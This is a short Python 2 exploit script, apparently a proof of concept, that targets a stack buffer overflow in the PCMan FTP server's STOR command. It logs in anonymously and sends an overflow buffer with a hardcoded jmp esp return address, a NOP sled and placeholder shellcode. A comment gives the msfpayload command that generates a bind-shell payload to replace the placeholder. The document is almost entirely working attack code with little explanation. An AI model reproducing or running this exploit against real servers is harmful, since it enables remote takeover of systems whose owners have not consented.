#!/usr/bin/python
#-------------------------------------------------------------------#
#			Name : Rio Atmadja			    #
#		       Script: ftp_pcman		   	    #
#-------------------------------------------------------------------#
import socket, sys, os, time

if len(sys.argv) != 2:
        print "[*] Usage: %s <Ip address> \n" % sys.argv[0]
        sys.exit(0)
target = sys.argv[1]

#msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
shellcode = '\xcc' * 489
vulparameter= '/../'
jmp_esp = "\x53\x93\x42\x7e" #7E429353 ( user32.dll -> jmp esp )
payload = '\x41' * 2003 + jmp_esp + '\x90' * 8 + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d" % (target,21)
try:
	s.connect((target,21))
        s.recv(1024)
	s.send('USER anonymous\r\n') 
	s.recv(1024)
	s.send('PASS polunchis\r\n')
	s.recv(1024)
	s.send("STOR " + vulparameter + payload + "\r\n")
        print "[+] Sending payload of size " +  str(len(payload)) + " Bytes "
	s.close()
	print "[+] Exploit Sent Successfully"
except:
	print "[-] Could not connect to " + target + ":21\r"
        sys.exit(0) 
